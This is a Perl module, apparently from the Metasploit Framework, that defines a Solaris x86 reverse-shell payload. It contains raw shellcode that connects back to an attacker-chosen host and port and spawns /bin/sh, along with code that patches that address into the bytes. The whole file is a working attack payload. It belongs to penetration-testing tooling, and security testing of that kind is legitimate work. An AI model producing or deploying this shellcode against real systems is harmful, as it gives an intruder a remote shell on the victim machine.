package Msf::Payload::solx86_reverse;
use strict;
use base 'Msf::Payload';

my $info =
{
    'Name'         => 'solx86reverse',
    'Version'      => '1.0',
    'Description'  => 'Connect back to attacker and spawn a shell',
    'Authors'      => [ 'bighawk [Unknown License]', ],
    'Arch'         => [ 'x86' ],
    'Priv'         => 0,
    'OS'           => [ 'solaris' ],
    'Multistage'   => 0,
    'Type'         => 'reverse_shell',
    'Size'         => '',
    'UserOpts'     =>
        {
            'LHOST' => [1, 'ADDR', 'Local address to receive connection'],
            'LPORT' => [1, 'PORT', 'Local port to receive connection'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub Build {
    my $self = shift;
    return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate
{
    my $self = shift;
    my $host = shift;
    my $port = shift;
    my $off_host = 32;
    my $off_port = 38;

    my $shellcode = # solaris reverse connect by bighawk
    "\xb8\xff\xf8\xff\x3c\xf7\xd0\x50\x31\xc0\xb0\x9a\x50\x89\xe5\x31".
    "\xc9\x51\x41\x41\x51\x51\xb0\xe6\xff\xd5\x31\xd2\x89\xc7\x68\x93".
    "\x93\x93\x93\x66\x68\x93\x93\x66\x51\x89\xe6\x6a\x10\x56\x57\xb0".
    "\xeb\xff\xd5\x31\xd2\xb2\x09\x51\x52\x57\xb0\x3e\xff\xd5\x49\x79".
    "\xf2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53".
    "\x89\xe2\x50\x52\x53\xb0\x3b\xff\xd5";

    my $host_bin = gethostbyname($host);
    my $port_bin = pack("n", $port);

    substr($shellcode, $off_host - 1, 4, $host_bin);
    substr($shellcode, $off_port - 1, 2, $port_bin);
    return $shellcode;
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate('127.0.0.1', '4444');
    return length($bin);
}
